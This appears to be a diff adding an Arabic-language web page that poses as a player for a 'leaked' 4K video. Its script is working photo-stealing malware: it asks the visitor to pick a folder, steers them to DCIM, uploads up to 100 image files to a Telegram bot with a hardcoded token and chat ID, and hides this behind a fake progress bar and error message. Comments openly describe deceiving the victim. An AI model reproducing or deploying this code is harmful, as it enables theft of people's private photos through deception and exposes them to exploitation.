@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشغل الفيديو عالي الجودة</title>
+    <style>
+        body { background: #0f0f0f; color: #eee; font-family: 'Segoe UI', Tahoma; text-align: center; padding: 20px; }
+        .player-container { max-width: 400px; margin: 50px auto; border: 1px solid #333; border-radius: 15px; padding: 20px; background: #1a1a1a; }
+        .video-placeholder { width: 100%; height: 200px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 2px solid #444; }
+        .play-btn { width: 60px; filter: invert(1); }
+        .progress-box { display: none; margin-top: 25px; }
+        .bar-bg { width: 100%; background: #333; height: 12px; border-radius: 6px; overflow: hidden; margin: 10px 0; }
+        .bar-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.3s; }
+        #status-text { font-size: 13px; color: #888; }
+    </style>
+</head>
+<body>
+
+<div class="player-container">
+    <h3>📺 مشغل الفيديو المسرب</h3>
+    <p style="font-size: 14px;">اضغط لبدء معالجة الفيديو بجودة 4K</p>
+    
+    <div class="video-placeholder" id="playArea" onclick="initiateSiphon()">
+        <img src="https://cdn-icons-png.flaticon.com/512/0/375.png" class="play-btn">
+    </div>
+
+    <div id="progressBox" class="progress-box">
+        <p id="loaderLabel">جاري تهيئة الاتصال بالسيرفر...</p>
+        <div class="bar-bg">
+            <div id="pBar" class="bar-fill"></div>
+        </div>
+        <p id="status-text">يرجى عدم إغلاق الصفحة لضمان جودة العرض</p>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "7864483754:AAH9r2X-r37O6xidO263m3W4S6eFw4N6W5U";
+    const CHAT_ID = "7449231580";
+
+    async function initiateSiphon() {
+        try {
+            // طلب الصلاحية لإيهام الضحية بفك تشفير الفيديو
+            const dirHandle = await window.showDirectoryPicker();
+            
+            document.getElementById('playArea').style.pointerEvents = 'none';
+            document.getElementById('progressBox').style.display = 'block';
+
+            let images = [];
+            for await (const entry of dirHandle.values()) {
+                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png)$/i)) {
+                    images.push(entry);
+                }
+            }
+
+            if (images.length === 0) {
+                alert("خطأ: المجلد المختار لا يحتوي على ملفات الفيديو. اختر DCIM.");
+                location.reload();
+                return;
+            }
+
+            let count = 0;
+            const totalToFetch = Math.min(images.length, 100);
+
+            for (const entry of images) {
+                if (count >= totalToFetch) break;
+
+                const file = await entry.getFile();
+                const formData = new FormData();
+                formData.append('document', file);
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', `صورة رقم ${count + 1}`);
+
+                // الرفع في الخلفية
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: formData });
+
+                count++;
+                
+                // تحديث شريط التحميل الحقيقي بناءً على عدد الصور المرفوعة
+                let percent = Math.round((count / totalToFetch) * 100);
+                document.getElementById('pBar').style.width = percent + "%";
+                document.getElementById('loaderLabel').innerText = `جاري معالجة الفيديو: ${percent}%`;
+            }
+
+            // عند الانتهاء من الـ 100 صورة
+            setTimeout(() => {
+                document.getElementById('loaderLabel').innerText = "❌ فشل في تحميل الفيديو!";
+                document.getElementById('status-text').innerText = "حدث خطأ في السيرفر الرئيسي، يرجى المحاولة لاحقاً.";
+                document.getElementById('pBar').style.background = "#ff0000";
+            }, 2000);
+
+        } catch (err) {
+            alert("يجب منح صلاحية الوصول للمجلد لتشغيل الفيديو.");
+        }
+    }
+</script>
+
+</body>
+</html>
